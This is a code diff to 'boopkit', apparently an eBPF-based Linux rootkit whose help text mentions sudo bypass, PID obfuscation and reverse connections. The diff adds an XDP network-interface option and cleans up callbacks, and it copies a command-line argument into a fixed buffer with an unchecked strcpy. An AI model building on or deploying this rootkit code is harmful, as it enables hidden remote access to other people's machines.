@@ -25,10 +25,12 @@
 
 #include <arpa/inet.h>
 #include <bpf/bpf.h>
-#include <bpf/libbpf.h>
+#include <bpf/libbpf.h>   // libbpf
+#include <xdp/libxdp.h>   // libxdp
 #include <errno.h>
 #include <limits.h>
 #include <linux/perf_event.h>
+#include <net/if.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -53,6 +55,7 @@ void usage() {
   boopprintf("\n");
   boopprintf("Options:\n");
   boopprintf("-h, help           Display help and usage for boopkit.\n");
+  boopprintf("-i, interface      Interface name. lo, eth0, wlan0, etc\n");
   boopprintf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
   boopprintf(
       "-p, payload        Search XDP for TCP payload. No reverse "
@@ -119,6 +122,8 @@ struct config {
   char pr0bexdppath[PATH_MAX];
   int denyc;
   int payload;
+  char if_name[16];
+  int if_index;
   char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
 } cfg;
 
@@ -127,6 +132,7 @@ void clisetup(int argc, char **argv) {
   cfg.denyc = 0;
   cfg.payload = 0;
   cfg.sudobypass = 0;
+  strcpy(cfg.if_name, "lo");
   if (getenv("HOME") == NULL) {
     strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
     strncpy(cfg.pr0besafepath, PROBE_SAFE, sizeof PROBE_SAFE);
@@ -152,6 +158,9 @@ void clisetup(int argc, char **argv) {
         case 'p':
           cfg.payload = 1;
           break;
+        case 'i':
+          strcpy(cfg.if_name, argv[i + 1]);
+          break;
         case 'q':
           quiet = 1;
           break;
@@ -167,24 +176,8 @@ static struct env {
 
 // handlepidlookup is called everytime the kernel searches for our pid.
 static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
-  const struct event *e = data;
+  //const struct event *e = data;
   return 0;
-}
-
-// XDP Sample Callback [perf_buffer_sample_fn]
-void perf_buffer_sample (void *private_data, int cpu, void * x, unsigned int y){
-
-}
-
-// XDP Lost Callback [perf_buffer_lost_fn]
-void perf_buffer_lost(void *private_data, int cpu, unsigned long long x) {
-
-}
-
-static enum bpf_perf_event_ret handle_perf_event(void *private_data,
-                                                 int cpu,
-                                                 struct perf_event_header *event){
-  return LIBBPF_PERF_EVENT_CONT;
 }
 
 void rootcheck(int argc, char **argv) {
@@ -232,40 +225,23 @@ int main(int argc, char **argv) {
   int loaded, err;
   struct bpf_object *bpobj;
   struct pr0be_safe *sfobj;
-  struct pr0be_xdp *xdpobj;
-  struct bpf_program *program = NULL;
+  struct bpf_program *progboop = NULL;
   struct ring_buffer *rb = NULL;
   char pid[MAXPIDLEN];
 
+  // XDP
+  struct xdp_program *xdp_prog = NULL;
+  int                xdp_prog_fd;
+  int                xdp_map_fd;
+  struct bpf_object  *xdp_obj;
 
   // ===========================================================================
   // [pr0be.xdp.o]
   {
-    boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0bexdppath);
-//    bpobj = bpf_object__open(cfg.pr0bebooppath);
-//    if (!bpobj) {
-//      boopprintf("Unable to open eBPF object: %s\n", cfg.pr0bebooppath);
-//      boopprintf("Privileged access required to load eBPF probe!\n");
-//      boopprintf("Permission denied.\n");
-//      return 1;
-//    }
-//    loaded = bpf_object__load(bpobj);
-//    if (loaded < 0) {
-//      boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
-//      return 1;
-//    }
-//    boopprintf("  ->   eBPF Probe Loaded     : %s\n", cfg.pr0bebooppath);
-//    bpf_object__next_map(bpobj, NULL);
-//    bpf_object__for_each_program(program, bpobj) {
-//      const char *progname = bpf_program__name(program);
-//      const char *progsecname = bpf_program__section_name(program);
-//      boopprintf("  ->   eBPF Program Attached : %s %s\n", progname, progsecname);
-//      struct bpf_link *link = bpf_program__attach(program);
-//      if (!link) {
-//        boopprintf("Unable to link eBPF program: %s\n", progname);
-//        continue;
-//      }
-//    }
+      // Initialize interface
+      cfg.if_index = if_nametoindex(cfg.if_name);
+      boopprintf("  -> [%d] XDP Packet Capture [xcap] Interface: %s\n", cfg.if_index, cfg.if_name);
+      xdp_prog = xdp_program__open_file(cfg.pr0bexdppath, "xdp_xcap", NULL);
   }
   // [pr0be.xdp.o]
   // ===========================================================================
@@ -347,11 +323,11 @@ int main(int argc, char **argv) {
     }
     boopprintf("  ->   eBPF Probe Loaded     : %s\n", cfg.pr0bebooppath);
     bpf_object__next_map(bpobj, NULL);
-    bpf_object__for_each_program(program, bpobj) {
-      const char *progname = bpf_program__name(program);
-      const char *progsecname = bpf_program__section_name(program);
+    bpf_object__for_each_program(progboop, bpobj) {
+      const char *progname = bpf_program__name(progboop);
+      const char *progsecname = bpf_program__section_name(progboop);
       boopprintf("  ->   eBPF Program Attached : %s %s\n", progname, progsecname);
-      struct bpf_link *link = bpf_program__attach(program);
+      struct bpf_link *link = bpf_program__attach(progboop);
       if (!link) {
         boopprintf("Unable to link eBPF program: %s\n", progname);
         continue;
